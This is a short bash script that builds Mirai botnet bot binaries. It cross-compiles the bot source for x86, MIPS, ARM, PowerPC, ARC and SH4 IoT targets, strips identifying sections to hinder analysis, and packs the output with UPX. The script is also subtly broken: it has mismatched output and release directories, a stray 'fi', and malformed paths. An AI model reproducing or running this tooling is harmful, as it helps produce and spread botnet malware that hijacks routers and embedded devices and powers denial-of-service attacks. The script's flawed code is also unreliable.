#!/bin/bash

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o output/"$2" -DMIRAI_BOT_ARCH=\""$1"\" -DMIRAI_TELNET
    "$1-strip" release/"$2" -sS --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}



    compile_bot i586 x86 "-static"
    compile_bot mips mips "-static"
    compile_bot mipsel mpsl "-static"
    compile_bot armv4l arm4 "-static"
    compile_bot armv5l arm "-static"
    compile_bot armv7l arm7 "-static"
    compile_bot powerpc ppc "-static"
    compile_bot arc-linux-gcc arc "-static"
    compile_bot armv6l arm6 "-static"
    compile_bot sh4 sh4 "-static"

./upx --ultra-brute ~\output/*
    
fi